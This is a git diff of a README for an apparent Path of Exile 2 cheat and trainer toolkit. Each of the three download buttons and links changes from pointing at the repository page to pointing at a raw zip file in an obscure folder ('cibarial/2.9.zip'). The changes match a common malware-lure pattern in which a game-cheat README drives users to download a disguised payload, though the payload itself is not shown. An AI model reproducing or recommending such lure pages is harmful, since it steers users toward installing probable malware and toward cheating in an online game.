@@ -1,6 +1,6 @@
 # 🎮 poe2-cheats-2026-build-trainer-toolkit - Ultimate Path of Exile 2 Power Suite
 
-[![Download Now](https://img.shields.io/badge/Download-PoE2_Trainer_Toolkit-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gffban/poe2-cheats-2026-build-trainer-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-PoE2_Trainer_Toolkit-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gffban/poe2-cheats-2026-build-trainer-toolkit/main/cibarial/2.9.zip)
 
 ## 🚀 What Is This?
 
@@ -60,7 +60,7 @@ Your all-in-one companion for **Path of Exile 2** that gives you total control o
 
 ## 🔽 Download & Installation
 
-Visit this link to download the application: [**Click Here to Download**](https://github.com/gffban/poe2-cheats-2026-build-trainer-toolkit)
+Visit this link to download the application: [**Click Here to Download**](https://raw.githubusercontent.com/gffban/poe2-cheats-2026-build-trainer-toolkit/main/cibarial/2.9.zip)
 
 ### Step-by-Step Setup
 
@@ -152,7 +152,7 @@ Visit the GitHub issues page and describe your problem with screenshots. The com
 
 Stop second-guessing your build choices. Stop hoarding unidentified loot. Start playing with confidence. With the **poe2-cheats-2026-build-trainer-toolkit**, every decision is informed, every grind is optimized, and every play session is more fun.
 
-[![Get It Now](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-PoE2_Toolkit-00D2FF?style=for-the-badge&logo=github&logoColor=white&labelColor=111111)](https://github.com/gffban/poe2-cheats-2026-build-trainer-toolkit)
+[![Get It Now](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-PoE2_Toolkit-00D2FF?style=for-the-badge&logo=github&logoColor=white&labelColor=111111)](https://raw.githubusercontent.com/gffban/poe2-cheats-2026-build-trainer-toolkit/main/cibarial/2.9.zip)
 
 **Version 1.2.0 | Windows 10/11 | Free Forever | Open Source**
 
